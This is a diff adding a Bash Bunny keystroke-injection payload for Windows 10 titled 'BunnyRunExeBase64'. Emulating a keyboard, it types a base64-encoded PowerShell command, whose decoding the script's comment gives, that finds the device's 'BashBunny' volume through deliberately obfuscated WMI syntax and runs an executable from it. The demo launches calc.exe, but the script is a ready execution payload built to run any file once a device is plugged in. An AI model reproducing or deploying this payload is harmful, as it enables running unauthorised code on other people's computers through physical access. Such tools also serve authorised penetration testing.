@@ -1,0 +1,19 @@
+# Title:         BunnyRunExeBase64
+# Description:   Run exe from a bunny directory using base64 cradle in order to mitigate QWERTY and QWERTZ layouts
+# Author:        ?m?
+# Props:
+# Version:       1.0
+# Category:      Execution
+# Target:        Windows 10
+# Attackmodes:   HID, Storage
+
+#Sets attack mode and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+#Runs Powershell cradle that executes calc.exe on BashBunny root dir
+#Payload decoded states `"CMD.exe /c ((gwmi win$(35-3)_volUME   -f 'LABel=''BashBunny''').NAME + 'CaLC.ExE')"`
+LED ATTACK
+RUN WIN Powershell -ce IgBDAE0ARAAuAGUAeABlACAALwBjACAAKAAoAGcAdwBtAGkAIAB3AGkAbgAkACgAMwA1AC0AMwApAF8AdgBvAGwAVQBNAEUAIAAgACAALQBmACAAJwBMAEEAQgBlAGwAPQAnACcAQgBhAHMAaABCAHUAbgBuAHkAJwAnACcAKQAuAE4AQQBNAEUAIAArACAAJwBDAGEATABDAC4ARQB4AEUAJwApACIA
+LED FINISH
